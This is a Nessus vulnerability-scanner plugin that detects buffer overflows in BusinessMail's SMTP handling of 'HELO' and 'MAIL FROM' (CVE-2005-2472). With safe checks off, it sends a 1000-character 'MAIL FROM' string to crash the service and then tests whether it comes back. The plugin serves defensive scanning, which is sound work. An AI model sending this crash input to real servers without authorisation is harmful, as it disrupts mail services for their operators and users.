#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote SMTP server is susceptible to buffer overflow attacks. 

Description :

The remote host is running BusinessMail, a commercial mail server for
Windows from NetCPlus. 

The version of BusinessMail on the remote host fails to sanitize input
to the 'HELO' and 'MAIL FROM' SMTP commands, which can be exploited by
an unauthenticated remote attacker to crash the SMTP service and
possibly even execute arbitrary code within the context of the server
process. 

See also : 

http://reedarvin.thearvins.com/20050730-01.html
http://lists.grok.org.uk/pipermail/full-disclosure/2005-August/035647.html

Solution : 

Unknown at this time.

Risk factor : 

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";


if (description) {
  script_id(19365);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2472");
  script_bugtraq_id(14434);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"18407");

  name["english"] = "BusinessMail Remote Buffer Overflow Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for remote buffer overflow vulnerabilities in BusinessMail";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  exit(0);
}


include("smtp_func.inc");


port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(0);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


# If the banner suggests it's BusinessMail...
banner = get_smtp_banner(port:port);
if (banner && "BusinessMail SMTP server" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    if (banner =~ "BusinessMail SMTP server ([0-3]\.|4\.([0-5].*|60.*|61\.0[0-2]))") {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Note that Nessus has determined the vulnerability exists on the\n",
        "remote host simply by looking at the software's banner.\n"
      );
      security_hole(port:port, data:report);
    }
  }
  # Otherwise...
  else {
    # Let's try to crash it.
    soc = smtp_open(helo:"nessus");
    if (!soc) exit(1);

    c = string("MAIL FROM:", crap(1000));
    send(socket:soc, data:string(c, "\r\n"));
    s = smtp_recv_line(socket:soc);
    close(soc);

    # Try once to reconnect.
    sleep(1);
    soc = open_sock_tcp(port);
    if (!soc || !smtp_recv_line(socket:soc)) {
      security_hole(port);
      exit(0);
    }
    close(soc);
  }
}
